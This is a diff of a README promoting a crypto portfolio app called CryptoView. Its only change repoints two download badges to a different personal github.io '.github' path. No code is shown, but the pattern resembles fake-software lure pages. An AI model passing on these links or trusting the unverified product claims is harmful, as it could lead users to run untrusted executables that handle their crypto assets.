@@ -4,7 +4,7 @@
 
 ## 📥 Download CryptoView Desktop App
 
-[![⬇️ Download CryptoView](https://img.shields.io/badge/Download-CryptoView-blue?style=for-the-badge&logo=windows)](https://cryptoview-desktop-app.github.io/.github/CryptoView)
+[![Download CryptoView](https://img.shields.io/badge/Download-CryptoView-blue?style=for-the-badge&logo=windows)](https://itimartavic.github.io/.github/cryptoview-multi-exchange-portfolio)
 
 ---
 
@@ -26,7 +26,7 @@ In addition to its powerful trading and tracking features, CryptoView supports c
 
 For traders seeking a reliable, secure, and feature-rich solution to manage their crypto assets across multiple platforms, CryptoView offers a comprehensive toolkit. By consolidating market data, portfolio management, and advanced trading capabilities into a single interface, it eliminates the inefficiencies of fragmented workflows and equips traders with the tools they need to operate effectively in the fast-moving cryptocurrency markets.
 
-[![⬇️ Download CryptoView](https://img.shields.io/badge/Download-CryptoView-blue?style=for-the-badge&logo=windows)](https://cryptoview-desktop-app.github.io/.github/CryptoView)
+[![Download CryptoView](https://img.shields.io/badge/Download-CryptoView-blue?style=for-the-badge&logo=windows)](https://itimartavic.github.io/.github/cryptoview-multi-exchange-portfolio)
 
 ---
 
